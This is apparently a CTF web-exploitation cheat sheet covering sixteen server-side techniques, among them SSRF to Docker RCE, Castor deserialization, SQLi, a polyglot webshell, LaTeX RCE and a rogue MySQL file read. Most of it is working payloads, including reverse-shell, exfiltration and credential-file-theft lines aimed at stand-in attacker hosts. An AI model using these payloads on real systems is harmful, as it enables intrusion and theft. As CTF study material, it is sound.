# CTF Web - Advanced Server-Side Techniques (Part 2)

## Table of Contents
- [SSRF to Docker API RCE Chain (H7CTF 2025)](#ssrf-to-docker-api-rce-chain-h7ctf-2025)
- [Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
- [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
- [SQLite File Path Traversal to Bypass String Equality (Codegate 2013)](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
- [HQL Injection via Non-Breaking Space (HackIM 2016)](#hql-injection-via-non-breaking-space-hackim-2016)
- [Base64-Encoded Path Traversal (Sharif CTF 2016)](#base64-encoded-path-traversal-sharif-ctf-2016)
- [Windows 8.3 Short Filename Path Traversal Bypass (Tokyo Westerns 2016)](#windows-83-short-filename-path-traversal-bypass-tokyo-westerns-2016)
- [URL parse_url() @ Symbol Bypass (EKOPARTY CTF 2016)](#url-parse_url--symbol-bypass-ekoparty-ctf-2016)
- [PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)](#php-zip-wrapper-lfi-via-pngzip-polyglot-plaidctf-2016)
- [XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)](#xss-to-ssti-chain-via-flask-error-pages-secuinside-2016)
- [INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)](#insert-into-dual-field-sqli-column-shift-cybersecurityrumble-2016)
- [Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)](#session-cookie-forgery-via-timestamp-seeded-prng-cybersecurityrumble-2016)
- [SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)](#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016)
- [LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)](#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016)
- [ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)](#elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017)
- [Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)](#rogue-mysql-server-load-data-local-file-read-volgactf-2018)

See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses, Flask/Werkzeug debug, XXE external DTD, WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE).

---

## SSRF to Docker API RCE Chain (H7CTF 2025)

**Pattern (Moby Dock):** Web app with SSRF vulnerability exposes unauthenticated Docker daemon API on port 2375. Chain SSRF through an internal proxy endpoint to relay POST requests and achieve RCE.

**Step 1 — Discover internal services via SSRF:**
```bash
# Enumerate localhost ports through SSRF
curl "http://target/validate?url=http://localhost:2375/version"
curl "http://target/validate?url=http://localhost:8090/docs"
```

**Step 2 — Extract files from running containers via Docker archive endpoint:**
```bash
# List containers
curl "http://target/validate?url=http://localhost:2375/containers/json"

# Read files from container filesystem (returns tar archive)
curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<container_id>/archive?path=/flag.txt"
```

**Step 3 — Execute commands via Docker exec API (requires POST relay):**

When SSRF only allows GET requests, find an internal endpoint that can relay POST requests (e.g., `/request?method=post&data=...&url=...`).

```bash
# 1. Create exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}\
&url=http://localhost:2375/v1.51/containers/<id>/exec"
# Returns: {"Id": "<exec_id>"}

# 2. Start exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"Detach\":false,\"Tty\":false}\
&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
```

**For reverse shell access:**
```bash
# 1. Download shell script into container
# Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]

# 2. Execute with sh (not bash — busybox containers lack bash)
# Cmd: ["sh", "/tmp/shell.sh"]
```

**Key Docker API endpoints for exploitation:**
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/version` | GET | Confirm Docker API access |
| `/containers/json` | GET | List running containers |
| `/containers/<id>/archive?path=<path>` | GET | Extract files (tar format) |
| `/containers/<id>/exec` | POST | Create exec instance |
| `/exec/<id>/start` | POST | Run exec instance |
| `/images/json` | GET | List available images |
| `/containers/create` | POST | Create new container |

**Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When SSRF is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).

---

## Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)

**Pattern:** Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes, allowing arbitrary Java class instantiation.

**Attack chain:** `xsi:type` → `PropertyPathFactoryBean` + `SimpleJndiBeanFactory` → JNDI/RMI → ysoserial JRMP listener → `CommonsBeanutils1` gadget → RCE

**Requires:** Java 11 (not 17+) — ysoserial gadgets fail on Java 17+ due to module access restrictions.

**XML payload example with Spring beans for RMI callback:**
```xml
<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:java="http://java.sun.com">
  <item xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
    <targetBeanName>
      <item xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
        <shareableResources>rmi://ATTACKER:1099/exploit</shareableResources>
      </item>
    </targetBeanName>
    <propertyPath>foo</propertyPath>
  </item>
</data>
```

```bash
# Start ysoserial JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'
```

**Key insight:** Castor XML without explicit mapping files is effectively an XML-based deserialization sink. The `xsi:type` attribute acts like Java's `ObjectInputStream` — any class on the classpath can be instantiated. Check `pom.xml` for `castor-xml`, `commons-beanutils`, and `commons-collections` dependencies. JNDI (Java Naming and Directory Interface) via RMI (Remote Method Invocation) provides the callback mechanism.

**Detection:** Java app using Castor XML for deserialization, `castor-xml` in `pom.xml`, `commons-beanutils`/`commons-collections` dependencies.

---

## Apache ErrorDocument Expression File Read (Zero HTB)

**Pattern:** Apache's `ErrorDocument` directive with expression syntax reads files at the Apache level, bypassing PHP engine disable.

**Requires:** `AllowOverride FileInfo` in userdir config.

**Attack chain:**
1. Upload `.htaccess` to subdirectory via SFTP (Secure File Transfer Protocol):
```apache
ErrorDocument 404 "%{file:/etc/passwd}"
```
2. Request a nonexistent URL in that directory to trigger the 404 handler
3. Read PHP source via `cat -v` to see raw content:
```apache
ErrorDocument 404 "%{file:/var/www/html/stats.php}"
```

**Key insight:** Works even when `php_admin_flag engine off` disables PHP execution in user directories. The `%{file:...}` expression is evaluated by Apache itself, not PHP — so PHP disable flags are irrelevant.

**Detection:** Apache with `mod_userdir`, `AllowOverride FileInfo`, writable `.htaccess` in subdirectories.

---

## SQLite File Path Traversal to Bypass String Equality (Codegate 2013)

**Pattern:** PHP code blocks a specific input value via string equality check, then interpolates the input into a filesystem path. Path normalization bypasses the string check while resolving to the blocked resource.

**Vulnerable code:**
```php
if ($_POST['name'] == "GM") die("you can not view&save with 'GM'");
$db = sqlite_open("/var/game_db/gamesim_" . $_SESSION['scrap'] . ".db");
```

**Exploit:** Set `name` to `/../gamesim_GM` — this fails the `== "GM"` check, but the constructed path `/var/game_db/gamesim_/../gamesim_GM.db` normalizes to `/var/game_db/gamesim_GM.db`.

```bash
curl -X POST -b 'session=...' \
  -d 'name=/../gamesim_GM' \
  'http://target/view.php'
```

**Key insight:** String equality checks on user input are bypassed whenever the input is later used in a filesystem path that undergoes normalization. The `../` sequence is invisible to string comparison but resolved by the OS. Look for this pattern wherever user input is both validated by string comparison and interpolated into file paths, database paths, or URLs.

---

## HQL Injection via Non-Breaking Space (HackIM 2016)

Hibernate Query Language blocks subqueries. Bypass by exploiting character encoding mismatch between HQL parser and underlying database (H2):

- HQL parser treats non-breaking space (U+00A0) as a regular character (concatenates tokens into one word)
- H2 database interprets U+00A0 as whitespace (separates tokens normally)

**Key insight:** Replace spaces in SQL subqueries with U+00A0 to smuggle them past HQL validation.

```python
val = u'\u00a0'  # non-breaking space
# HQL sees: "selectXflagXfromXflagXlimitX1" (one token)
# H2 sees:  "select flag from flag limit 1" (valid SQL)
payload = u"' and (cast(concat('->', (select{0}flag{0}from{0}flag{0}limit{0}1)) as int))=0 or ''='".format(val)
```

Error-based extraction: cast result to int triggers error containing the flag value.

---

## Base64-Encoded Path Traversal (Sharif CTF 2016)

When file inclusion uses base64-encoded filenames as parameters:

```text
file.php?page=aGVscC5wZGY=    (decodes to "help.pdf")
```

Encode traversal payloads in base64:

```python
import base64
# ../index.php
print(base64.b64encode(b"../index.php").decode())  # Li4vaW5kZXgucGhw
# ../../etc/passwd
print(base64.b64encode(b"../../etc/passwd").decode())  # Li4vLi4vZXRjL3Bhc3N3ZA==
```

**Key insight:** Base64 encoding absorbs path traversal characters (`../`) that filters might block in raw form.

---

## Windows 8.3 Short Filename Path Traversal Bypass (Tokyo Westerns 2016)

On Windows, files with long names have auto-generated 8.3 short name aliases. When a blacklist checks the full filename, the short name bypasses the filter.

```text
# Blacklisted file: file_list (e.g., readfile('file_list') is blocked)
# Windows 8.3 short name: file_l~1

# Bypass:
GET /read?file=file_l~1

# How 8.3 names are generated:
# - First 6 chars of name (minus spaces/special chars) + ~1
# - Extension truncated to 3 chars
# Examples:
#   "file_list.txt"     -> "FILE_L~1.TXT"
#   "longfilename.html" -> "LONGFI~1.HTM"
#   "program files"     -> "PROGRA~1"

# Discovery: use dir /x on Windows to list short names
# dir /x C:\path\to\files\
```

**Key insight:** Windows NTFS auto-generates 8.3 short filenames for compatibility. Blacklists checking full filenames miss the short alias. This bypass works on any Windows web server (IIS, WAMP, etc.) where 8.3 name generation is enabled (default).

---

## URL parse_url() @ Symbol Bypass (EKOPARTY CTF 2016)

PHP's `parse_url()` treats the `@` symbol as a userinfo delimiter, interpreting everything before `@` as credentials and everything after as the host. This enables URL validation bypass.

```php
// Server validates URL host must be ctf.example.com
// parse_url("http://attacker.com@ctf.example.com/")
//   -> host: ctf.example.com (passes validation)

// But wget/curl follow RFC and connect to attacker.com:
// wget "http://attacker.com@ctf.example.com/"
//   -> Actually connects to: attacker.com

// Exploit for URL shortener/fetcher:
$url = "http://{$attacker_ip}@ctf.ekoparty.org/?";
// parse_url() sees host = ctf.ekoparty.org (passes whitelist)
// wget connects to $attacker_ip (attacker-controlled)

// Check attacker's Apache logs for the flag in User-Agent or request
```

**Key insight:** `parse_url()` and actual HTTP clients (wget, curl, browsers) disagree on how to handle `@` in URLs. `parse_url()` extracts the host after `@`, while HTTP clients may connect to the host before `@`. This SSRF vector bypasses domain whitelist validation.

---

## PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)

**Pattern (pixelshop):** PHP `include()` appends `.php` extension (no null byte on modern PHP). Upload is restricted to valid images (.png). Use `zip://` wrapper to include PHP code from inside a ZIP archive embedded in a PNG file.

1. Use `php://filter/read=convert.base64-encode/resource=` to leak source files and understand the include logic
2. Upload a valid PNG image to get a known filename on the server
3. Inject a ZIP archive into the PNG's palette data (ZIP format reads headers from the end of the file, so a valid PNG can simultaneously be a valid ZIP):

```python
import binascii, requests, struct

def craft_png_zip_polyglot(php_payload):
    """Craft a ZIP payload to inject into PNG palette bytes."""
    # ZIP stores its central directory at the end of the file
    # Calculate offsets based on the known PNG prefix length
    # The ZIP's local file header offset points into the palette region
    # php_payload goes inside the ZIP as "s.php"

    # Pre-built ZIP with s.php containing: <?=`$_GET[a]`?>
    zip_hex = (
        "504B0304140000000800"  # Local file header
        # ... compressed PHP shell ...
        "504B01021400140000000800"  # Central directory
        # ... points back to local header at palette offset ...
        "504B0506000000000100010033000000690000000000"  # End of central directory
    )
    return zip_hex

def inject_payload(image_key, payload_hex):
    """Use the image editor API to set palette bytes containing the ZIP."""
    palette_bytes = binascii.unhexlify(payload_hex)
    # Convert to RGB triplets for palette API
    colors = []
    for i in range(0, len(palette_bytes), 3):
        chunk = palette_bytes[i:i+3].ljust(3, b'\x00')
        colors.append(f'"#{chunk[0]:02x}{chunk[1]:02x}{chunk[2]:02x}"')
    palette_json = ",".join(colors)
    # POST to save endpoint with crafted palette
    requests.post(f"{base_url}?op=save", data={
        "imagekey": image_key,
        "savedata": f'{{"pal": [{palette_json}], "im": [{",".join(["0"]*1024)}]}}'
    })
```

4. Include the embedded PHP file via zip:// wrapper:
```text
http://target/?op=zip://uploads/HASH.png%23s
```
This unzips `HASH.png` (which is also a valid ZIP) and includes `s.php` from inside it.

**Key insight:** ZIP files store their central directory at the end, so any file format can have a valid ZIP appended (or embedded) without breaking the original format. The `zip://` PHP wrapper ignores file extensions and extracts by content. PNG palette data provides controllable consecutive bytes ideal for embedding small ZIP payloads. This bypasses: (a) file extension restrictions (.php → .png), (b) image validation (file remains a valid PNG), (c) metadata stripping (palette data is structural, not metadata).

---

## XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)

**Pattern (SBBS):** Flask app renders 404 error messages using `render_template_string()` with the request URL interpolated. Error pages only appear for localhost requests. Chain XSS → localhost fetch → SSTI in error page.

1. Flask error handler directly interpolates URL into template:
```python
@app.errorhandler(404)
def not_found(e=None):
    message = "%s was not found on the server." % request.url
    return render_template_string(template % message), 404
```

2. Error pages only render for 127.0.0.1 (external IPs get nginx 404)

3. XSS payload triggers localhost request with SSTI in the URL:
```javascript
<script>
function hack(url, callback){
    var x = new XMLHttpRequest();
    x.onreadystatechange = function(){
        if (x.readyState == 4)
            window.open('http://attacker.com/exfil?' + x.responseText, '_self', false)
    }
    x.open("GET", url, true);
    x.send();
}
hack("/{{ config.from_object('admin.app') }}{{ config.FLAG }}")
</script>
```

4. `config.from_object('module.path')` loads application config including secrets

**Key insight:** Flask's template globals don't directly expose the `app` object, but `config.from_object()` can load arbitrary Python modules into the config dict, making their attributes accessible via `{{ config.KEY }}`. The XSS-to-SSTI chain bypasses two restrictions: (a) SSTI only works on localhost error pages, (b) template globals lack direct app access. Look for `render_template_string()` with user-controlled input in error handlers.

---

## INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)

**Pattern (Illuminati):** INSERT query with two injectable fields (subject: 40-char limit, message: unlimited). Chain injections across both fields to bypass the length restriction.

```sql
-- Original query:
INSERT INTO requests (id, "$subject", "$message")

-- Subject (40 chars max):
theSubject",concat(

-- Message (unlimited):
,(select group_concat(table_name) from information_schema.tables)))#

-- Result:
INSERT INTO requests (id, "theSubject",concat("",(select group_concat(...))))#"...")
```

The `concat("", (select ...))` wraps the subquery result as a string value for the subject column, making it visible when the user views their own messages.

**Key insight:** When an INSERT query has multiple injectable fields but one is length-limited, use the limited field to open a `concat(` expression and the unlimited field to close it with an arbitrary subquery. This "column shift" technique moves the data extraction from the length-restricted field to the unrestricted one. Also works with `CASE WHEN` or other SQL expressions that span across field boundaries.

---

## Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)

**Pattern (Illuminati):** Session cookies constructed as `random_int-user_id`, where `random_int` is seeded by the user's last login timestamp. Extract the admin's timestamp via SQLi, reproduce the PRNG to forge their cookie.

```python
import random

# 1. Extract admin login timestamp via SQLi
admin_timestamp = 1229569179  # from: SELECT last_login FROM users WHERE id=209

# 2. Seed PRNG with timestamp
random.seed(admin_timestamp)

# 3. Generate the same random int the server produced
cookie_random = random.randint(0, 2**31)

# 4. Forge admin cookie
admin_cookie = f"{cookie_random}-209"
# Result: "1229569179-209"
```

**Key insight:** Timestamps used as PRNG seeds for session tokens create a deterministic oracle. If the login timestamp is leaked (via SQLi, error messages, or API responses), the full token is reproducible. This pattern appears whenever session randomness depends on a single predictable seed value (time, PID, counter). Check for `random.seed(time())` or `srand(time(NULL))` in session generation code.

---

## SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)

**Pattern (list0r):** PHP `parse_url()` and curl interpret URLs with multiple `@` symbols differently. The URL `http://what:ever@127.0.0.1:80@allowed.host/path` causes PHP to see `host = allowed.host` (passing a CIDR/domain whitelist check), while curl resolves to `127.0.0.1:80` (treating the second `@` as literal), achieving SSRF to localhost.

```php
// PHP parse_url behavior:
parse_url("http://what:ever@127.0.0.1:80@allowed.host/path");
// => ['host' => 'allowed.host', 'user' => 'what', ...]

// curl behavior with same URL:
// Connects to 127.0.0.1:80 (first @ delimits credentials)
// "ever@127.0.0.1:80" parsed as password, but curl connects to first IP

// Exploit: bypass CIDR blacklist by making parse_url see whitelisted host
$url = "http://x:x@127.0.0.1:80@" . $allowed_domain . "/secret/flag";
// parse_url sees $allowed_domain -> passes check
// curl connects to 127.0.0.1:80 -> SSRF achieved
```

**Key insight:** URL parsers disagree on how to handle multiple `@` symbols. This is distinct from the single-`@` bypass (EKOPARTY 2016) — here the double-`@` exploits a different parsing ambiguity where `parse_url` takes the last `@` as the userinfo delimiter while curl uses the first. Test both variants when facing URL-based SSRF filters.

---

## LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)

**Pattern (pdfmaker):** When `pdflatex` runs with `write18` in restricted mode (only whitelisted commands like `mpost` allowed), exploit `mpost`'s `-tex` flag to specify an alternative TeX processor — setting it to `bash -c (command)` achieves shell execution. Use `${IFS}` as space replacement since mpost's argument parsing strips spaces.

```latex
% Create a MetaPost file via LaTeX
\begin{filecontents}{test.mp}
beginfig(1); endfig; end;
\end{filecontents}

% Execute mpost with bash as the "TeX processor"
\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}/flag)>out.log" "test.mp"}

% Read the output back into the PDF
\input{out.log}
```

**Key insight:** `mpost` is whitelisted by restricted `write18` because it's needed for MetaPost diagrams. But its `-tex` flag allows specifying an arbitrary program as the "TeX processor," including `bash`. This transforms a restricted shell escape into full RCE. `${IFS}` replaces spaces to work within the quoted argument.

---

## ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)

**Pattern:** When SSRF reaches an internal ElasticSearch instance (default port 9200), Groovy scripting in `script_fields` enables remote code execution. ElasticSearch versions before 5.0 allowed inline Groovy scripts by default.

```bash
# SSRF payload to ElasticSearch internal API
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "exec": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}'

# Read a specific file
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "read": {
      "script": "new java.io.File(\"/flag.txt\").text"
    }
  }
}'

# For blind RCE, exfiltrate via curl upload
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "exfil": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl --upload-file /flag attacker.com:4042\").getText()"
    }
  }
}'
```

**Via SSRF (URL-encoded for GET parameter):**
```python
import requests
import urllib.parse

es_payload = '{"script_fields":{"exec":{"script":"new java.io.File(\\"/flag.txt\\").text"}}}'
ssrf_url = f"http://localhost:9200/_search?source={urllib.parse.quote(es_payload)}&source_content_type=application/json"

# Through SSRF endpoint
r = requests.get(f"http://target/fetch?url={urllib.parse.quote(ssrf_url)}")
print(r.text)
```

**Detection:** SSRF vulnerability + internal service on port 9200. Confirm with `http://localhost:9200/` (returns ES version info) or `http://localhost:9200/_cat/indices` (lists indices).

**Key insight:** ElasticSearch pre-5.0 exposed Groovy scripting via the `_search` API. Even without direct access, SSRF to port 9200 enables full RCE through `script_fields`. Modern ES versions disabled inline scripting by default. When testing SSRF, always probe port 9200 -- ElasticSearch is a common internal service with powerful script execution capabilities.

---

### Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)

**Pattern:** When a service connects to your controlled MySQL server with `LOAD DATA LOCAL` enabled, send a rogue response requesting arbitrary file reads from the client machine. The MySQL protocol allows the server to request the client to send any local file during the `LOAD DATA LOCAL INFILE` handshake, regardless of what query the client intended to execute.

**How it works:**
1. Victim application connects to attacker-controlled MySQL server (e.g., via SSRF or misconfigured DB host)
2. Attacker server completes the handshake normally
3. When the client sends any query, the rogue server responds with a file transfer request packet
4. The client reads the requested local file and sends its contents to the server

```python
# Rogue MySQL server — simplified core logic
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 3306))
server.listen(1)
conn, addr = server.accept()

# Send server greeting (MySQL handshake)
greeting = bytes.fromhex(
    '4a0000000a352e362e32382d'  # version 5.6.28
    '307562756e747530'          # ubuntu0
    '2e31342e30342e31'          # .14.04.1
    '001d000000'                # connection id
    '2a5e2a683e6a2b29'          # auth plugin data part 1
    '00fff70800'                # capability flags
    '210000000000000000000000'  # more fields
    '00'
    '282a4e3b3a592635254a2944'  # auth plugin data part 2
    '00'
)
conn.send(greeting)

# Receive client auth response
conn.recv(4096)

# Send OK packet (auth success)
conn.send(bytes.fromhex('0700000200000002000000'))

# Wait for client to send a query
conn.recv(4096)

# Check client capability bit "Can Use LOAD DATA LOCAL: Set"
# Send rogue file read request for /etc/passwd
dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
conn.send(dump_etc_passwd)  # rogue MySQL file read request

# Receive file contents from client
file_data = conn.recv(65535)
print(f"[+] Received file contents:\n{file_data.decode(errors='replace')}")

conn.close()
```

**Useful files to request:**
```text
/etc/passwd                    # User enumeration
/etc/shadow                    # Password hashes (if client runs as root)
/proc/self/environ             # Environment variables with secrets
/var/www/html/config.php       # Application config with DB credentials
/home/user/.ssh/id_rsa         # SSH private keys
/flag.txt                      # CTF flag
```

**Key insight:** A rogue MySQL server can request the connecting client to send any local file via the LOAD DATA LOCAL protocol, regardless of what query the client intended to execute. This works because the MySQL protocol allows the server to respond to any client query with a file transfer request. Look for challenges where you can control the MySQL host a service connects to (SSRF, config injection, DNS rebinding). The client must have `LOAD DATA LOCAL` enabled (default in many MySQL client libraries).
